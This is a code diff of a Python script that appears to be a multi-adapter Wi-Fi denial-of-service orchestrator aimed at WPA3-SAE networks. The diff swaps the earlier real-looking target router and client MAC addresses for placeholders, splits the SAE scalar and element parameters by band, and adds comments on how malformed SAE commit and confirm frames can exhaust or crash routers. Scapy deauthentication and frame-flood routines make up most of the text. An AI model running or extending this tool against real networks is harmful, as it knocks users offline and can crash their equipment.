@@ -1,4 +1,16 @@
 #!/usr/bin/env python3
+"""
+================================================================================
+Wi-Fi DoS Orchestrator - COMPLETE ARSENAL (26 Attacks)
+================================================================================
+Based on: "How is your Wi-Fi connection today? DoS attacks on WPA3-SAE"
+Journal of Information Security and Applications (2022)
+
+FOR EDUCATIONAL PURPOSES AND AUTHORIZED SECURITY TESTS ONLY!
+================================================================================
+"""
+
+#!/usr/bin/env python3
 import subprocess
 import time
 import os
@@ -13,8 +25,8 @@ from multiprocessing import Process, Value
 # =====================================================================================
 
 # --- 1. TARGET DATA ---
-TARGET_BSSID_5GHZ = "64:67:72:81:9C:6E"
-TARGET_BSSID_2_4GHZ = "64:67:72:81:9C:6D"
+TARGET_BSSID_5GHZ = "AA:BB:CC:DD:EE:11"
+TARGET_BSSID_2_4GHZ = "AA:BB:CC:DD:EE:11"
 
 # --- 2. OPTIONAL SCANNER ---
 SCANNER_INTERFACE = "wlan0mon" # e.g. "wlan7mon" or ""
@@ -23,13 +35,11 @@ SCANNER_INTERFACE = "wlan0mon" # e.g. "wlan7mon" or ""
 MANUELLER_KANAL_5GHZ = "36"
 MANUELLER_KANAL_2_4GHZ = "1"
 
-# --- 4. TARGET CLIENTS (For targeted attacks) ---
+# --- 4. TARGET CLIENTS (For targeted attacks) --- For: pmf_deauth_exploit, deauth_flood, malformed_msg1_length & malformed_msg1_flags
 TARGET_STA_MACS = [
-    "30:34:DB:11:48:09",
-#    "06:B2:AA:AC:5D:31",
-    "B2:5D:F9:73:10:6C"#,
-#    "6E:8F:9F:B4:3D:10"#,
-#    "82:49:2C:43:16:81"
+    "AA:BB:CC:DD:EE:11", 
+    "AA:BB:CC:DD:EE:11",
+    "AA:BB:CC:DD:EE:11"
 ]
 
 # ====================== COMPLETE ENCYCLOPEDIA OF ATTACKS ======================
@@ -68,6 +78,21 @@ TARGET_STA_MACS = [
 # "bad_status_code": Sends SAE confirm frames with an invalid status code.
 # "empty_frame_confirm": Sends empty SAE confirm frames.
 #
+#    bad_algo (Invalid Algorithm)
+#    Explanation: The WPA3-SAE handshake requires the "Authentication Algorithm" value to be 3 (SAE). This attack sends thousands of frames with incorrect values (e.g., 5, 10, 255).
+#    Goal: The router wastes CPU cycles checking its internal database to see if it supports this unknown algorithm and generating error responses. Poorly written firmware may crash.
+#
+#    bad_seq (Invalid Sequence Number)
+#    Explanation: A handshake follows a strict order. Sequence 1 is "Commit", Sequence 2 is "Confirm". This attack sends packets with illogical sequence numbers (e.g., Sequence 3 or 0) right at the start.
+#    Goal: Confusing the router's State Machine. The router tries to map the packet to an existing session, fails, and wastes memory on "orphaned" connection attempts.
+#
+#    bad_status_code (Invalid Status Code)
+#    Explanation: Normally, a status code of 0 ("Success") is sent. This attack sends SAE Confirm frames with failure codes (e.g., "Unknown Error" or reserved values).
+#    Goal: Forces the router to execute error-handling routines, which are often more computationally expensive than processing a standard successful connection.
+#
+#    empty_frame_confirm (Empty Confirm Frame)
+#    Explanation: An SAE Confirm packet mandates the inclusion of cryptographic data (a verifier hash). This attack sends the packet header but leaves the body/payload completely empty.
+#    Goal: A classic implementation bug test. If the router's software tries to read or parse data that isn't there, it can trigger a "Buffer Underflow" or "Null Pointer Exception," causing the router to crash and reboot immediately.
 # ==============================================================================================
 
 # --- CENTRAL ADAPTER & ATTACK CONFIGURATION ---
@@ -87,9 +112,18 @@ ADAPTER_KONFIGURATION = {
 #    "wlan5mon": {"band": "2.4GHz", "angriff": "cookie_guzzler"},
 #    "wlan9mon": {"band": "2.4GHz", "angriff": "cookie_guzzler"}            
 }
-# --- SAE PARAMETERS ---
-SAE_SCALAR_HEX = '49f7dcc4fb5725917c2ba1412ff42123f2dc699a0950db0828fe9d01c9786b80'
-SAE_FINITE_ELEMENT_HEX = '8632644e22320b3b9943f62e52df25de17b8833c03b11c4cc403aebdf7d0b2c68607dc39a2891e0e8243b4990e493a25abc8ce6ebad06da0e201879f966c6518'
+
+# --- SAE PARAMETERS (SPLIT FOR 2.4 GHz AND 5 GHz) ---
+# IMPORTANT: Enter DIFFERENT values for 2.4 GHz and 5 GHz as BSSIDs differ!
+
+# > Parameters for 2.4 GHz Network
+SAE_SCALAR_2_4_HEX = '49f7dcc4fb5725917c2ba1412ff42123f2dc699a0950db0828fe9d01c9786b80'
+SAE_FINITE_2_4_HEX = '8632644e22320b3b9943f62e52df25de17b8833c03b11c4cc403aebdf7d0b2c68607dc39a2891e0e8243b4990e493a25abc8ce6ebad06da0e201879f966c6518'
+
+# > Parameters for 5 GHz Network
+SAE_SCALAR_5_HEX = 'INSERT_5_SCALAR_HERE'
+SAE_FINITE_5_HEX = 'INSERT_5_FINITE_HERE'
+
 # ======================== SCRIPT LOGIC STARTS HERE ========================
 def run_deauth_disassoc_process(interface, bssid, channel, sta_mac_list, attack_type, counter, **kwargs):
     from scapy.all import sendp, RadioTap, Dot11, Dot11Deauth
@@ -119,8 +153,20 @@ def run_sae_attack_process(interface, bssid, channel, sta_mac_list, attack_type,
         subprocess.run(['iwconfig', interface, 'channel', channel], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     except (subprocess.CalledProcessError, FileNotFoundError): return
     
-    SAE_SCALAR_BYTES = bytes.fromhex(SAE_SCALAR_HEX)
-    SAE_FINITE_ELEMENT_BYTES = bytes.fromhex(SAE_FINITE_ELEMENT_HEX)
+    # Retrieve correct SAE parameters based on band passed via kwargs
+    scalar_hex = kwargs.get('scalar_hex')
+    finite_hex = kwargs.get('finite_hex')
+
+    if not scalar_hex or not finite_hex:
+        print(f"[ERROR-SAE] Missing SAE parameters for {interface}. Aborting.")
+        return
+
+    try:
+        SAE_SCALAR_BYTES = bytes.fromhex(scalar_hex)
+        SAE_FINITE_ELEMENT_BYTES = bytes.fromhex(finite_hex)
+    except ValueError:
+        print(f"[ERROR-SAE] Invalid HEX string for SAE parameters on {interface}.")
+        return
 
     try:
         while True:
@@ -275,8 +321,17 @@ def main():
                         if "deauth" in attack_type: target_process = run_deauth_disassoc_process
                         elif "malformed" in attack_type: target_process = run_eapol_attack_process
                         
+                        # --- NEW: Select correct SAE parameters based on band ---
+                        scalar_to_use = SAE_SCALAR_5_HEX if band == '5GHz' else SAE_SCALAR_2_4_HEX
+                        finite_to_use = SAE_FINITE_5_HEX if band == '5GHz' else SAE_FINITE_2_4_HEX
+
+                        kwargs = {
+                            'scalar_hex': scalar_to_use, 
+                            'finite_hex': finite_to_use
+                        }
+
                         args = (interface, bssid, channel, TARGET_STA_MACS, attack_type, counters[interface])
-                        procs[interface] = Process(target=target_process, args=args)
+                        procs[interface] = Process(target=target_process, args=args, kwargs=kwargs)
                         procs[interface].start()
 
             status_line = " | ".join([f"{iface}({conf['angriff'][:4]}..): {counters[iface].value}" for iface, conf in ADAPTER_KONFIGURATION.items()])
@@ -289,3 +344,4 @@ def main():
 
 if __name__ == "__main__":
     main()
+    
